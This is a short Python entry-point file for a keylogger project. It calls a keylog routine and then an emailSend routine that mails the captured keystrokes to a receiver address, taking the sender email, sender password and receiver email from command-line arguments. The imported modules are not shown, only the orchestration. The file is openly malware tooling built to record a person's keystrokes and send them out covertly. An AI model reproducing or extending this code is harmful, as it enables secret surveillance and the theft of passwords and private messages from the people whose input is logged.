import sys
from keylog import keylog
from emailSend import emailSend
'''
This is the main file for the function, where argv[1] contains the sender email, argv[2] contains the sender password, 
and argv[3] contains the reciver email. 
'''
if __name__ == '__main__':
    keylog()
    emailSend(sys.argv[1], sys.argv[2], sys.argv[3])





